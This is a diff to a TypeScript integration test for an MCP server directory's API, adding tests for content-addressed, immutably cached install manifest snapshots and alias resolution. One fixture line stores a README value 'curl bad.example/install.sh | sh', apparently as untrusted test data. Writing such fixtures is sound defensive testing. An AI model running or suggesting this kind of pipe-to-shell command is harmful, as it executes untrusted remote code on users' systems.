@@ -1,7 +1,9 @@
 import { eq } from "drizzle-orm";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
+import { installManifestResponseSchema } from "@themcpdirectory/api-contract";
 import {
   registrySources,
+  repositorySnapshots,
   serverHealthChecks,
   serverAliases,
   serverPackages,
@@ -101,6 +103,24 @@ beforeAll(async () => {
     .from(servers)
     .where(eq(servers.slug, "github"));
   if (!github?.currentVersionId) throw new Error("Expected GitHub server row");
+  await temp.db
+    .update(servers)
+    .set({
+      repositoryUrl: "https://github.com/github/github-mcp-server",
+      repositorySource: "github",
+      repositoryExternalId: "99123",
+    })
+    .where(eq(servers.id, github.id));
+  await temp.db.insert(repositorySnapshots).values({
+    serverId: github.id,
+    provider: "github",
+    externalRepositoryId: "99123",
+    owner: "GitHub",
+    name: "github-mcp-server",
+    url: "https://github.com/github/github-mcp-server",
+    payload: { readme: "curl bad.example/install.sh | sh" },
+    checkedAt: new Date("2026-09-01T12:00:00.000Z"),
+  });
   await temp.db.insert(serverAliases).values({
     serverId: github.id,
     alias: "github-server",
@@ -250,6 +270,105 @@ describe("public API core routes", () => {
     expect(generated.headers.get("cache-control")).toContain("private");
   });
 
+  it("exposes content-addressed install snapshots without marking mutable slug URLs immutable", async () => {
+    const current = await app.request("/api/v1/servers/github/install?client=cursor", {
+      headers: { "X-Request-ID": "req_task9_install_current" },
+    });
+    const currentBody = installManifestResponseSchema.parse(await current.json());
+
+    expect(current.status).toBe(200);
+    expect(currentBody.manifestHash).toMatch(/^[a-f0-9]{64}$/);
+    expect(current.headers.get("etag")).toMatch(/^"[a-f0-9]{64}"$/);
+    expect(current.headers.get("cache-control")).not.toContain("immutable");
+    expect(current.headers.get("content-location")).toBe(
+      `/api/v1/servers/github/install/${currentBody.manifestHash}?client=cursor`,
+    );
+
+    const snapshotPath = current.headers.get("content-location");
+    if (!snapshotPath) throw new Error("Expected immutable snapshot location");
+    const firstSnapshot = await app.request(snapshotPath, {
+      headers: { "X-Request-ID": "req_task9_snapshot_one" },
+    });
+    const firstSnapshotText = await firstSnapshot.text();
+
+    const [github] = await temp.db
+      .select({ id: servers.id })
+      .from(servers)
+      .where(eq(servers.slug, "github"));
+    const [source] = await temp.db
+      .select({ id: registrySources.id })
+      .from(registrySources)
+      .where(eq(registrySources.key, "official"));
+    if (!github || !source) throw new Error("Expected GitHub fixture identity");
+    const [replacementVersion] = await temp.db
+      .insert(serverVersions)
+      .values({
+        serverId: github.id,
+        registrySourceId: source.id,
+        version: "2.0.0",
+        upstreamStatus: "active",
+        title: "GitHub Changed",
+        description: "Changed mutable listing metadata",
+        publishedAt: new Date("2026-09-02T10:00:00.000Z"),
+        firstSeenAt: new Date("2026-09-02T12:00:00.000Z"),
+        lastSeenAt: new Date("2026-09-02T12:00:00.000Z"),
+        normalizedPayload: {},
+      })
+      .returning({ id: serverVersions.id });
+    if (!replacementVersion) throw new Error("Expected replacement version");
+    await temp.db.insert(serverPackages).values({
+      serverVersionId: replacementVersion.id,
+      registryType: "npm",
+      identifier: "@github/mcp-server",
+      version: "2.0.0",
+      runtimeHint: "npx",
+      transportType: "stdio",
+      fileSha256: "b".repeat(64),
+    });
+    await temp.db
+      .update(servers)
+      .set({ currentVersionId: replacementVersion.id, title: "GitHub Changed" })
+      .where(eq(servers.id, github.id));
+
+    const changedCurrent = installManifestResponseSchema.parse(
+      await (await app.request("/api/v1/servers/github/install?client=cursor")).json(),
+    );
+    const secondSnapshot = await app.request(snapshotPath, {
+      headers: { "X-Request-ID": "req_task9_snapshot_two" },
+    });
+
+    expect(firstSnapshot.status).toBe(200);
+    expect(firstSnapshot.headers.get("cache-control")).toBe("public, max-age=31536000, immutable");
+    expect(firstSnapshot.headers.get("etag")).toBe(`"${currentBody.manifestHash}"`);
+    expect(changedCurrent.manifestHash).not.toBe(currentBody.manifestHash);
+    expect(installManifestResponseSchema.parse(JSON.parse(firstSnapshotText))).toMatchObject({
+      data: currentBody.data,
+      manifestHash: currentBody.manifestHash,
+    });
+    expect(await secondSnapshot.text()).toBe(firstSnapshotText);
+    expect(
+      (await app.request(`/api/v1/servers/second-server/install/${currentBody.manifestHash}`))
+        .status,
+    ).toBe(404);
+    expect(
+      (
+        await app.request(
+          `/api/v1/resolve/second-server/install/${currentBody.manifestHash}?client=cursor`,
+        )
+      ).status,
+    ).toBe(404);
+    expect(
+      (await app.request(`/api/v1/servers/github/install/${currentBody.manifestHash}`)).status,
+    ).toBe(404);
+
+    const resolved = await app.request("/api/v1/resolve/github-server/install?client=cursor");
+    expect(resolved.headers.get("etag")).toMatch(/^"[a-f0-9]{64}"$/);
+    expect(resolved.headers.get("cache-control")).not.toContain("immutable");
+    expect(resolved.headers.get("content-location")).toBe(
+      `/api/v1/servers/github/install/${changedCurrent.manifestHash}?client=cursor`,
+    );
+  });
+
   it("serves HEAD for collection, detail, and install routes with headers and no body", async () => {
     for (const path of [
       "/api/v1/servers?limit=1",
@@ -302,7 +421,12 @@ describe("public API core routes", () => {
     const aliasInstall = await app.request("/api/v1/servers/github-server/install");
     expect(aliasInstall.status).toBe(404);
 
-    for (const identifier of ["github-server", "%40github%2Fmcp-server"]) {
+    for (const identifier of [
+      "github-server",
+      "%40github%2Fmcp-server",
+      "github%2Fgithub-mcp-server",
+      "https%3A%2F%2Fgithub.com%2FGitHub%2Fgithub-mcp-server%2F",
+    ]) {
       const resolvedInstall = await app.request(`/api/v1/resolve/${identifier}/install`);
       expect(resolvedInstall.status).toBe(200);
       await expect(resolvedInstall.json()).resolves.toMatchObject({
